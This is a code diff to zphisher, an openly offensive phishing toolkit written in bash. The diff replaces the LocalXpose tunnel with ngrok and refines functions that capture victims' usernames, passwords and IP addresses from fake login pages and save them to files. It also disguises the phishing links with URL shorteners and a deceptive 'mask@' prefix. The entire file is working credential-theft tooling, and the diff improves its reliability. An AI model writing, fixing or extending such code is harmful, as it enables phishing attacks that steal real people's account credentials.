@@ -92,6 +92,12 @@
 
 __version__="2.3.5"
 
+## Bash version check (read -i requires Bash 4+)
+if [[ ${BASH_VERSINFO[0]} -lt 4 ]]; then
+    echo "Error: Bash 4+ required. Current version: ${BASH_VERSION}"
+    exit 1
+fi
+
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
 PORT='8080' 
@@ -153,10 +159,10 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php cloudflared loclx"
+	check_PID="php cloudflared ngrok"
 	for process in ${check_PID}; do
-		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Kill the Process
+		if pgrep -x "$process" > /dev/null 2>&1; then # Check for Process
+			pkill -x "$process" > /dev/null 2>&1 # Kill the Process
 		fi
 	done
 }
@@ -173,8 +179,7 @@ check_update(){
 		sleep 2
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
 
 		if [[ -e ".zphisher.tar.gz" ]]; then
 			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
@@ -275,24 +280,23 @@ dependencies() {
 download() {
 	url="$1"
 	output="$2"
-	file=`basename $url`
+	file=$(basename "$url")
 	if [[ -e "$file" || -e "$output" ]]; then
 		rm -rf "$file" "$output"
 	fi
-	curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
+	curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
 
 	if [[ -e "$file" ]]; then
-		if [[ ${file#*.} == "zip" ]]; then
-			unzip -qq $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
-		elif [[ ${file#*.} == "tgz" ]]; then
-			tar -zxf $file > /dev/null 2>&1
-			mv -f $output .server/$output > /dev/null 2>&1
+		if [[ ${file##*.} == "zip" ]]; then
+			unzip -qq "$file" > /dev/null 2>&1
+			mv -f "$output" .server/"$output" > /dev/null 2>&1
+		elif [[ ${file##*.} == "tgz" ]]; then
+			tar -zxf "$file" > /dev/null 2>&1
+			mv -f "$output" .server/"$output" > /dev/null 2>&1
 		else
-			mv -f $file .server/$output > /dev/null 2>&1
+			mv -f "$file" .server/"$output" > /dev/null 2>&1
 		fi
-		chmod +x .server/$output > /dev/null 2>&1
+		chmod +x .server/"$output" > /dev/null 2>&1
 		rm -rf "$file"
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
@@ -319,21 +323,21 @@ install_cloudflared() {
 	fi
 }
 
-## Install LocalXpose
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+## Install Ngrok
+install_ngrok() {
+	if [[ -e ".server/ngrok" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+			download 'https://bin.equinox.io/c/VzLjNn4H3f/ngrok/ngrok-linux-arm' 'ngrok'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+			download 'https://bin.equinox.io/c/VzLjNn4H3f/ngrok/ngrok-linux-arm64' 'ngrok'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+			download 'https://bin.equinox.io/c/VzLjNn4H3f/ngrok/ngrok-linux-64' 'ngrok'
 		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+			download 'https://bin.equinox.io/c/VzLjNn4H3f/ngrok/ngrok-linux-386' 'ngrok'
 		fi
 	fi
 }
@@ -411,22 +415,24 @@ setup_site() {
 
 ## Get IP address
 capture_ip() {
-	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+	local ip_file="${1:-.server/www/ip.txt}"
+	IP=$(awk -F'IP: ' '{print $2}' "$ip_file" | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
-	cat .server/www/ip.txt >> auth/ip.txt
+	cat "$ip_file" >> auth/ip.txt
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	local creds_file="${1:-.server/www/usernames.txt}"
+	ACCOUNT=$(grep -oE '(Username|Email):.*' "$creds_file" | awk '{print $NF}')
+	PASSWORD=$(grep -oE 'Pass(word)?:.*' "$creds_file" | awk -F ': ' '{print $NF}')
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
-	cat .server/www/usernames.txt >> auth/usernames.dat
+	cat "$creds_file" >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -435,15 +441,21 @@ capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
-			capture_ip
-			rm -rf .server/www/ip.txt
+			mv .server/www/ip.txt .server/www/ip.txt.processing 2>/dev/null
+			if [[ -e ".server/www/ip.txt.processing" ]]; then
+				echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+				capture_ip < .server/www/ip.txt.processing
+				rm -f .server/www/ip.txt.processing
+			fi
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
-			capture_creds
-			rm -rf .server/www/usernames.txt
+			mv .server/www/usernames.txt .server/www/usernames.txt.processing 2>/dev/null
+			if [[ -e ".server/www/usernames.txt.processing" ]]; then
+				echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+				capture_creds < .server/www/usernames.txt.processing
+				rm -f .server/www/usernames.txt.processing
+			fi
 		fi
 		sleep 0.75
 	done
@@ -464,47 +476,38 @@ start_cloudflared() {
 	fi
 
 	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	cldflr_url=$(grep -oE 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' ".server/.cld.log" | head -1)
 	custom_url "$cldflr_url"
 	capture_data
 }
 
-localxpose_auth() {
-	./.server/loclx -help > /dev/null 2>&1 &
-	sleep 1
-	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
-
-	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
-		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
-		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
-		} || {
-			echo -n "$loclx_token" > $auth_f 2> /dev/null
-		}
-	}
-}
-
-## Start LocalXpose (Again...)
-start_loclx() {
+## Start Ngrok
+start_ngrok() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; localxpose_auth; }
+	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you have an Ngrok Auth Token? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " ngrok_op
+	if [[ ${ngrok_op,,} == "y" ]]; then
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your Ngrok Auth Token :${ORANGE} " NGROK_AUTHTOKEN
+		[[ -z "$NGROK_AUTHTOKEN" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ngrok Auth Token cannot be empty."
+			{ sleep 2; tunnel_menu; }
+		}
+		./.server/ngrok authtoken "$NGROK_AUTHTOKEN" > /dev/null 2>&1
+	fi
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		sleep 1 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" --log=stdout > .server/.ngrok.log 2>&1 &
 	else
-		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+		sleep 1 && ./.server/ngrok http "$HOST":"$PORT" --log=stdout > .server/.ngrok.log 2>&1 &
 	fi
 
-	sleep 12
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
-	custom_url "$loclx_url"
+	sleep 8
+	ngrok_url=$(cat .server/.ngrok.log | grep -oE 'https://[a-zA-Z0-9.-]*\.ngrok\.io' | head -1)
+	[[ -z "$ngrok_url" ]] && ngrok_url=$(cat .server/.ngrok.log | grep -oE 'http://[a-zA-Z0-9.-]*\.ngrok\.io' | head -1)
+	custom_url "$ngrok_url"
 	capture_data
 }
 
@@ -525,7 +528,7 @@ tunnel_menu() {
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Ngrok        ${RED}[${CYAN}Auth Required${RED}]
 
 	EOF
 
@@ -537,7 +540,7 @@ tunnel_menu() {
 		2 | 02)
 			start_cloudflared;;
 		3 | 03)
-			start_loclx;;
+			start_ngrok;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -552,7 +555,8 @@ custom_mask() {
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
+		# Simple validation: must start with http:// or https:// and have a valid domain
+		if [[ ${mask_url} =~ ^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$ ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 		else
@@ -562,36 +566,32 @@ custom_mask() {
 }
 
 ## URL Shortner
-site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+site_stat() { [[ ${1} != "" ]] && curl -s -o /dev/null -w "%{http_code}" "${1}"; }
 
 shorten() {
-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	if [[ "$1" == *"shrtco.de"* ]]; then
-		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-	else
-		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
-		processed_url=${short#http*//}
-	fi
+	short=$(curl --silent --insecure --fail --retry 2 --retry-delay 2 "$1$2")
+	# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+	processed_url=${short#http*//}
 }
 
 custom_url() {
-	url=${1#http*//}
+	url=${1#http*//*}
 	isgd="https://is.gd/create.php?format=simple&url="
-	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*trycloudflare\.com ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
 		else
 			shorten $tinyurl "$url"
 		fi
 
+		# Strip protocol from mask for userinfo component
+		mask_clean="${mask#https://}"
+		mask_clean="${mask_clean#http://}"
 		url="https://$url"
-		masked_url="$mask@$processed_url"
+		masked_url="$mask_clean@$processed_url"
 		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
@@ -907,5 +907,5 @@ kill_pid
 dependencies
 check_status
 install_cloudflared
-install_localxpose
+install_ngrok
 main_menu
